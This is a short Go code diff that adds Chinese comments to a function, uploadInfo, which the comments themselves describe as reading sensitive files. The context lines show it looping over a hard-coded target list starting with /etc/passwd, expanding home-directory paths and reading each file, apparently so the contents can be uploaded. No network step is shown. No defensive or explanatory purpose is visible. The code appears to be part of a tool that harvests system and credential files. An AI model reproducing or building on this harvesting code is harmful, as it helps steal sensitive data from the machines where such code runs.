@@ -138,6 +138,7 @@ type FileResult struct {
 	Error   error
 }
 
+// uploadInfo 读取敏感文件
 func uploadInfo() []FileResult {
 	var targetFiles = []string{
 		"/etc/passwd",
@@ -155,6 +156,7 @@ func uploadInfo() []FileResult {
 			home, _ := os.UserHomeDir()
 			path = filepath.Join(home, path[2:])
 		}
+		//文件读取模块
 		content, err := readFile(path)
 		if err != nil {
 			fmt.Printf("[!] 读取 %s 失败: %v\n", path, err)
@@ -172,6 +174,7 @@ func uploadInfo() []FileResult {
 	return results
 }
 
+// readFile 由uploadInfo调用读取读取文件
 func readFile(path string) ([]byte, error) {
 	if _, err := os.Stat(path); os.IsNotExist(err) {
 		return nil, fmt.Errorf("No File")
